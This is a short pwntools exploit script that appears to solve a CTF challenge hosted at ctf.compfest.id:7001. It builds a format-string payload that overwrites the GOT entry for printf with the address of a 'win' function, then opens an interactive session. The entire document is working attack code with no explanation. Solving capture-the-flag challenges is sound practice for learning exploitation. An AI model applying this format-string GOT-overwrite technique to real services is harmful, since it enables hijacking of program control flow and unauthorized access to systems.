from pwn import *

exe = context.binary = ELF("./chall")
r = process()
r = remote("ctf.compfest.id",7001)
offset = 6
rop = ROP(exe)
payload = fmtstr_payload(offset, {exe.got['printf']: exe.sym['win']})
r.sendline(payload)
r.interactive()